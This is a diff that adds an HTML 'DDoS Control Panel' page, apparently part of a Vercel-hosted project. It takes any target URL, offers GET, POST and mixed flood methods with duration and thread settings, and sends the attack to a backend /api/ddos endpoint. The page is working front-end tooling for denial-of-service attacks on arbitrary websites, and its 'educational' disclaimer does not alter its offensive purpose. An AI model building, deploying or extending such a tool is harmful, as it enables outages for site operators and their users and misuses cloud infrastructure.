@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DDoS Control Panel — GPTX 13D</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 700px;
+            width: 100%;
+            border: 2px solid #00ff41;
+            padding: 30px;
+            border-radius: 10px;
+            background: #0d0d0d;
+            box-shadow: 0 0 50px rgba(0,255,65,0.1);
+        }
+        h1 {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 5px;
+            text-shadow: 0 0 20px #00ff41;
+        }
+        .subtitle {
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 20px;
+        }
+        .url-display {
+            background: #111;
+            padding: 10px;
+            border: 1px solid #333;
+            border-radius: 5px;
+            color: #88ff88;
+            font-size: 11px;
+            word-break: break-all;
+            margin: 15px 0;
+        }
+        input, select, button {
+            width: 100%;
+            padding: 12px;
+            margin: 6px 0;
+            background: #1a1a1a;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        input:focus, select:focus {
+            outline: none;
+            box-shadow: 0 0 20px rgba(0,255,65,0.2);
+        }
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin: 10px 0;
+        }
+        .btn-group button {
+            flex: 1;
+        }
+        .btn-attack {
+            background: #00ff41;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-attack:hover {
+            box-shadow: 0 0 30px #00ff41;
+            transform: scale(1.02);
+        }
+        .btn-stop {
+            background: #ff4444;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-stop:hover {
+            box-shadow: 0 0 30px #ff4444;
+        }
+        .status {
+            background: #000;
+            padding: 15px;
+            border: 1px solid #00ff41;
+            margin: 15px 0;
+            min-height: 120px;
+            max-height: 300px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            font-size: 12px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            line-height: 1.6;
+        }
+        .status::-webkit-scrollbar {
+            width: 5px;
+        }
+        .status::-webkit-scrollbar-track {
+            background: #111;
+        }
+        .status::-webkit-scrollbar-thumb {
+            background: #00ff41;
+            border-radius: 5px;
+        }
+        .warning {
+            color: #ffaa00;
+            font-size: 11px;
+            text-align: center;
+            margin-top: 15px;
+            border-top: 1px solid #222;
+            padding-top: 15px;
+        }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+            margin: 10px 0;
+        }
+        .stat-box {
+            background: #000;
+            padding: 10px;
+            text-align: center;
+            border: 1px solid #00ff41;
+            border-radius: 5px;
+        }
+        .stat-box .number {
+            font-size: 22px;
+            font-weight: bold;
+            display: block;
+        }
+        .stat-box .label {
+            font-size: 10px;
+            color: #666;
+        }
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+        .row > * {
+            flex: 1;
+        }
+        @media (max-width: 600px) {
+            .row { flex-direction: column; }
+            .btn-group { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🐍 DDoS CONTROL v3.0</h1>
+    <div class="subtitle">Powered by Vercel Edge Network + GitHub</div>
+    
+    <div class="url-display" id="baseUrl">
+        🚀 Vercel URL: https://your-app.vercel.app
+    </div>
+    
+    <input type="text" id="target" placeholder="Target URL (https://example.com)" value="http://example.com">
+    
+    <div class="row">
+        <select id="method">
+            <option value="get">GET Flood</option>
+            <option value="post">POST Flood</option>
+            <option value="mixed">Mixed Attack</option>
+        </select>
+        <input type="number" id="duration" placeholder="Duration (s)" value="30" min="5" max="60">
+        <input type="number" id="threads" placeholder="Threads" value="20" min="5" max="50">
+    </div>
+    
+    <div class="stats-grid">
+        <div class="stat-box">
+            <span class="number" id="statRequests">0</span>
+            <span class="label">Requests</span>
+        </div>
+        <div class="stat-box">
+            <span class="number" id="statSuccess">0</span>
+            <span class="label">Success</span>
+        </div>
+        <div class="stat-box">
+            <span class="number" id="statFailed">0</span>
+            <span class="label">Failed</span>
+        </div>
+    </div>
+    
+    <div class="btn-group">
+        <button class="btn-attack" onclick="startAttack()">⚡ LAUNCH ATTACK</button>
+        <button class="btn-stop" onclick="stopAttack()">✖ STOP</button>
+    </div>
+    
+    <div class="status" id="statusLog">
+[SYSTEM] Ready. Enter target and launch attack.
+[INFO] Vercel edge network will execute the attack.
+    </div>
+    
+    <div class="warning">
+        ⚠️ For educational & testing purposes only. Vercel has 60s execution limit.
+    </div>
+</div>
+
+<script>
+let attackRunning = false;
+let statusInterval = null;
+let currentStats = { requests: 0, success: 0, failed: 0 };
+
+function updateStats(data) {
+    if (data) {
+        currentStats.requests = data.requests || 0;
+        currentStats.success = data.success || 0;
+        currentStats.failed = data.failed || 0;
+    }
+    document.getElementById('statRequests').textContent = currentStats.requests;
+    document.getElementById('statSuccess').textContent = currentStats.success;
+    document.getElementById('statFailed').textContent = currentStats.failed;
+}
+
+function log(message) {
+    const logEl = document.getElementById('statusLog');
+    const timestamp = new Date().toLocaleTimeString();
+    logEl.textContent += '\n[' + timestamp + '] ' + message;
+    logEl.scrollTop = logEl.scrollHeight;
+}
+
+function getBaseUrl() {
+    return window.location.origin;
+}
+
+async function startAttack() {
+    const target = document.getElementById('target').value.trim();
+    const method = document.getElementById('method').value;
+    const duration = document.getElementById('duration').value || 30;
+    const threads = document.getElementById('threads').value || 20;
+    
+    if (!target) {
+        log('ERROR: Target URL required');
+        return;
+    }
+    
+    if (attackRunning) {
+        log('WARNING: Attack already running');
+        return;
+    }
+    
+    attackRunning = true;
+    currentStats = { requests: 0, success: 0, failed: 0 };
+    updateStats();
+    
+    const baseUrl = getBaseUrl();
+    const url = `${baseUrl}/api/ddos?target=${encodeURIComponent(target)}&duration=${duration}&method=${method}&threads=${threads}`;
+    
+    log(`🚀 LAUNCHING attack on ${target}`);
+    log(`   Method: ${method} | Duration: ${duration}s | Threads: ${threads}`);
+    log(`   Endpoint: ${url}`);
+    
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
+        log(`✅ Attack completed: ${data.requests} requests sent`);
+        log(`   Success: ${data.success} | Failed: ${data.failed}`);
+        log(`   Source: Vercel edge network (${data.note || 'multi-region'})`);
+        currentStats.requests = data.requests || 0;
+        currentStats.success = data.success || 0;
+        currentStats.failed = data.failed || 0;
+        updateStats();
+    } catch (error) {
+        log(`❌ Attack failed: ${error.message}`);
+    } finally {
+        attackRunning = false;
+    }
+}
+
+function stopAttack() {
+    if (attackRunning) {
+        attackRunning = false;
+        log('✖ Attack stopped by user');
+    } else {
+        log('ℹ️ No attack running to stop');
+    }
+}
+
+// Display base URL
+document.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('baseUrl').textContent = 
+        '🚀 Vercel URL: ' + window.location.origin;
+    log('✅ Control panel loaded');
+    log(`📍 API endpoint: ${window.location.origin}/api/ddos`);
+});
+</script>
+</body>
+</html>
